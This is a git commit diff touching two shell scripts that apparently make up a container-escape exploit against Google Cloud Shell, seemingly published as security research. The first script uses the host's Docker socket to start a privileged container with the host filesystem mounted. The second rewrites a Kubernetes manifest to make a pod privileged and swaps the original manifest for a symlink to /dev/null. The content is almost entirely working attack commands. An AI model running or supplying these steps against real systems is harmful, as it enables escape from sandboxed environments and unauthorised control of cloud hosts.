67ed10c62c936ccef55e1317e88a0ca849c21283
wtm@offensi.com <wtm@offensi.com>
2019-08-07 13:44:57 +0200

    preserve yaml indenting

--- 1-escape-from-cloudshell.sh
+++ 1-escape-from-cloudshell.sh
@@ -3,3 +3,7 @@ sudo docker -H unix:///google/host/var/run/docker.sock pull alpine:latest
 sudo docker -H unix:///google/host/var/run/docker.sock run -d -it --name LiveOverflow-container -v "/proc:/host/proc" -v "/sys:/host/sys" -v "/:/rootfs" --network=host --privileged=true --cap-add=ALL alpine:latest
 sudo docker -H unix:///google/host/var/run/docker.sock start LiveOverflow-container
 sudo docker -H unix:///google/host/var/run/docker.sock exec -it LiveOverflow-container /bin/sh
+
+
+
+
--- 2-reconfigure-kubernetes.sh
+++ 2-reconfigure-kubernetes.sh
@@ -2,17 +2,16 @@
 # wtm@offensi.com
 
 # write new manifest
-cat /etc/kubernetes/manifests/cs-6000.yaml | sed s/"'securityContext': \!\!null 'null'/\
-'securityContext':\n\
-\t'privileged': \!\!bool 'true'\n\
-\t'procMount': \!\!null 'null'\n\
-\t'runAsGroup': \!\!null 'null'\n\
-\t'runAsUser': \!\!null 'null'\n\
-\t'seLinuxOptions': \!\!null 'null'\n"/g > /tmp/cs-6000.yaml
+cat /etc/kubernetes/manifests/cs-6000.yaml | sed s/"    'securityContext': \!\!null 'null'"/\
+"    'securityContext':\n"\
+"      'privileged': \!\!bool 'true'\n"\
+"      'procMount': \!\!null 'null'\n"\
+"      'runAsGroup': \!\!null 'null'\n"\
+"      'runAsUser': \!\!null 'null'\n"\
+"      'seLinuxOptions': \!\!null 'null'\n"/g > /tmp/cs-6000.yaml
 
 # replace old manifest with symlink
-rm -f /etc/kubernetes/manifests/cs-6000.yaml
-ln -s /dev/null /etc/kubernetes/manifests/cs-6000.yaml
-mv /tmp/cs-6000.yaml /etc/kubernetes/manifests/cs-6000-privileged-mode-enabled.yaml
+mv /tmp/cs-6000.yaml /etc/kubernetes/manifests/cs-6000.modified
+ln -fs /dev/null /etc/kubernetes/manifests/cs-6000.yaml
 
-# now wait for the containers to restart and reload your browser
+
